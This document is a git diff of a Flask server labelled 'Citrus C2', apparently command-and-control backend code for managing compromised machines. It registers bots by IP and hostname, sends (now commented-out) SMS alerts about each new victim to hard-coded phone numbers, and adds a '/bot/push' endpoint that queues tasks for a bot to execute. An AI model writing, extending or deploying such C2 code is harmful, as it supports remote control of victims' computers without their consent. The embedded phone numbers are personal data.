@@ -7,18 +7,18 @@ import uuid
 
 from . import routes
 
-from twilio.rest import Client
+# from twilio.rest import Client
 
-from dotenv import load_dotenv
+# from dotenv import load_dotenv
 import os
 
 client_api = Blueprint('client_api', __name__)
-load_dotenv()
+# load_dotenv()
 
 #Twilio
 account_sid = os.getenv('twilio_account_sid')
 auth_token  = os.getenv('twilio_auth_token')
-client = Client(account_sid, auth_token)
+# client = Client(account_sid, auth_token)
 
 # Firestore/Firebase Stuff
 cred = credentials.Certificate("serviceAccountKey.json")
@@ -37,11 +37,11 @@ def index(hostname):
         'tasks': [],
     })
 
-    message = client.messages.create(
-        to="+17148512888", 
-        from_="+12185208855",
-        body=f"\n=Citrus C2 Notification: New Machine=\nIP: {request.remote_addr}\nHostname: {hostname}\nUUID: {id}"
-    )
+    # message = client.messages.create(
+    #     to="+17148512888", 
+    #     from_="+12185208855",
+    #     body=f"\n=Citrus C2 Notification: New Machine=\nIP: {request.remote_addr}\nHostname: {hostname}\nUUID: {id}"
+    # )
 
     return {'uuid': id}
 
@@ -78,3 +78,19 @@ def info():
         tmp['uuid']=x.to_dict()['uuid']
         res.append(tmp)
     return jsonify(res)
+
+@routes.route('/bot/push', methods=['POST'])
+def push():
+    machines = db.collection('machines').where(
+        'uuid', '==', request.headers.get('uuid')).limit(1).get()
+
+    if not machines:
+        return {'Error': 'No machines found'}
+
+    machine = machines[0]
+    tasks = machine.to_dict()['tasks']
+
+    tasks.append(request.headers.get('task'))
+    machine.reference.update({'tasks': tasks})
+
+    return {'success': True}
